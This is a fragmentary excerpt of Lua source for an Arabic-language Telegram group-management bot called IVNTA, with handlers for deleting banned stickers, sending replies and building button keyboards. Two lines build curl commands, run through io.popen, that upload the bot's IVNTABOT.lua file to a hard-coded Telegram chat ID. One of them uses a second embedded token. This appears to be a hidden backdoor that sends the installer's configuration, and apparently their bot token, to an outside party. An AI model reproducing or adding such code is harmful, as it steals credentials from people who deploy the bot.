...
local curlm = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 1705066859 ..'" -F "document=@'..'IVNTABOT.lua'..'"' io.popen(curlm) 
...
local curla = 'curl "'..'https://api.telegram.org/bot'.. sex1 ..'/sendDocument'..'" -F "chat_id='.. 1705066859 ..'" -F "document=@'..'IVNTABOT.lua'..'"' io.popen(curla)
...
send(msg.chat_id_,0, "𖤓عذرا يا ⇠ ["..data.first_name_.."](T.ME/so_ivnta)\n𖤓 الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
end
end,nil)   
Delete_Message(msg.chat_id_,{[0] = msg.id_})       
return false   
...
send(msg.chat_id_, msg.id_, t..'━━━━━━\nاضغط علي الاسم ليتم نسخه\n━━━━━━━━━━━━━━━━━━━ٴ\n𖤓 [⚡️ 𝐈𝐕𝐍𝐓𝐀⚡️](http://t.me/so_ivnta) 𖤓')
end
...
{{text = 'قناه السورس', url="t.me/so_ivnta"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local file_Info_Sudo = io.open("IVNTABOT.lua", 'w')
